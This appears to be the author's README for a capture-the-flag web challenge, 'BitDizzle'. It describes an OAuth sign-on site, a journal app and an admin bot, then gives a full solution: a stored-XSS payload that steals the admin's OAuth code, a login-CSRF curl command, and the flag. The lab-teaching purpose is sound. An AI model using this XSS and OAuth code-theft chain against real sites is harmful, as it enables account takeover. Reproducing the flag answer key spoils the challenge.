# BitDizzle

## Public Description

Flag: `ASV{m0re_lik3_N0AUTH_Am_i_r1GhT}`

A popular journal writing app just came out. Can you read `admin`'s journal?

https://bitdizzle.xyz/

(upload accounts/accounts.py and journal/journal.py to CTFd, but no other files)

## Design

This challenge is two websites: a single sign-on site (accounts.bitdizzle.xyz)
and a journal writing app (journal.bitdizzle.xyz). `accounts` acts as an OAuth
provider for `journal`.

These are both Flask apps, each with a sqlite database to store state.

### OAuth flow

When a user clicks "Login with OAuth" to log into the journal:

1. User requests `accounts/oauth_authorize?client_id=...&redirect_uri=https://journal/oauth_callback`
2. `accounts` generates an "auth code", and redirects the user to `journal/oauth_callback?code=<code>`
3. User requests `journal/oauth_callback?code=<code>`
4. `journal` requests `accounts/token` and passes its client secret and the user's code
  * The `client_secret` is intended to remain secret. Players aren't supposed
    to figure out how to send requests to this endpoint.
5. `accounts` responds to `journal` with the username for that code
6. `journal` responds to the user and sets a login cookie

```
| user |                | accounts |             | journal |
   |   /oauth_authorize      |                        |
   |  -------------------->  |                        |
   |   redirect to journal   |                        |
   |  <--------------------  |                        |
   |   /oauth_callback?code=<code>                    |
   |  --------------------------------------------->  |
   |                         |   /token (code=code)   |
   |                         |  <-------------------  |
   |                         |   username=<foo>       |
   |                         |  ------------------->  |
   |     success             |                        |
   |  <---------------------------------------------  |
   |                         |                        |
```

### Journal

The journal is a React app. The app's initial props are passed to the client
with an inline `<script>` tag in the initiar HTML. The script stores a big
JSON object with all the initial props in a global variable.

In case players make their own journals hard to use (eg. by creating `alert(1)`
XSS PoCs), there's a "Delete all journal entries" button.

### CSRF/XSS "victim" bot

The accounts page lets you submit links to a headless Chrome bot. The bot is
logged into both `accounts` and `journal` as `admin`.

The bot maintains a separate queue of URLs to visit per IP address of the
submitter. So if one CTF player submits lots of URLs to the bot, it will still
be able to visit other players' URLs.

### Deployment instructions

See deployment.md for the steps I took to deploy this to a Digital Ocean box.

## Solution

### Vulnerabilities we're going to exploit

There are 3 main problems with this site:

**An attacker can force a victim to log into the attacker's journal**

An attacker can make the first request in the OAuth flow, write down their code,
and trick a victim into making the second request with the attacker's code. The
victim will end up logged into the attacker's journal.

**XSS in the journal site, in the `initialProps` script tag**

If you create a journal entry with the title `</script><script>alert(1)//` and
reload, you'll get this HTML:

```
<script>window.initialProps = {"entries": [{"title": "</script><script>alert(1)//", "body": "...</script>`
```

Browsers parse HTML before they try to evaluate the JS in script tags. So to a
browser, the page looks something like this, and an alert box pops up:

```
<script>window.initialProps = {"entries": [{"title": "</script>
<script>alert(1)//", "body": "...</script>
```

**`accounts` allows redirects to any URI on `journals`**

Our goal is to intercept `admin`'s OAuth code, and log into their journal. Here
are the steps from an attacke's perspective:

### Exploit

The steps to log into `admin`'s journal are:

**1. Create a journal entry with XSS**

Create a journal entry with any title, and this text in the body. Avoid
refreshing the page, or you might "steal" one of your own auth codes instead of
admin's.

```
</script><script>if (window.location.search.indexOf('code') === -1) { window.location = 'https://accounts.bitdizzle.xyz/oauth_authorize?client_id=f45735d5a3b056b6&redirect_uri=https://journal.bitdizzle.xyz/'; } else { fetch('/entries/', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({title: 'stolen code', body: window.location.search})}); } //
```

You can't add any newlines, or the JSON serializer will replace them with `\n`.
Here's what that JS looks like with some more whitespace:

```
if (window.location.search.indexOf("code") === -1) {
  // Step 1: Send admin through the OAuth flow again, but with redirect_uri=/
  // instead of /oauth_callback
  window.location =
    "https://accounts.bitdizzle.xyz/oauth_authorize?client_id=f45735d5a3b056b6&redirect_uri=https://journal.bitdizzle.xyz/";
} else {
  // Step 2: When admin finishes that OAuth flow, they'll run your XSS payload
  // again with their auth code in their query params. Steal it by creating a
  // journal entry
  fetch("/entries/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      title: "stolen code",
      body: window.location.search,
    }),
  });
}
```

**2. Force admin to log into your journal**

Get an auth code for your account by making a request to `/oauth_authorize`
without following the redirect.

2.1. Go to the `accounts` site, open your browser console, and copy the value of
     your `__Host-session` cookie.
2.2. Run this command in your termal, but replace `YOUR_SESSION` with your actual
     sesion cookie:

```
$ curl -I "https://accounts.bitdizzle.xyz/oauth_authorize?client_id=f45735d5a3b056b6&amp;"\
"redirect_uri=https%3A%2F%2Fjournal.bitdizzle.xyz%2Foauth_callback" \
-H "Cookie: __Host-session=YOUR_SESSION"
```

2.3. Copy the `Location` header (which should be a URL that contains
     `/oauth_callback`), and paste it into the "Submit a Link" form on the
     `accounts` site

**3. Retrieve admin's auth code**

Once admin visits your journal, your XSS should create a journal entry in your
journal containing their auth code.

In Chrome, you can visit `view-source:https://journal.bitdizzle.xyz/` to avoid
running your XSS payload against yourself.

You should see an entry that looks like:

```
{"title": "stolen code", "body": "?code=<admin code>"}
```

Copy the stolen code.

**4. Log into admin's journal**

Visit `https://journal.bitdizzle.xyz/oauth_callback?code=<admin code>`

> ### Flag
> `ASV{m0re_lik3_N0AUTH_Am_i_r1GhT}`
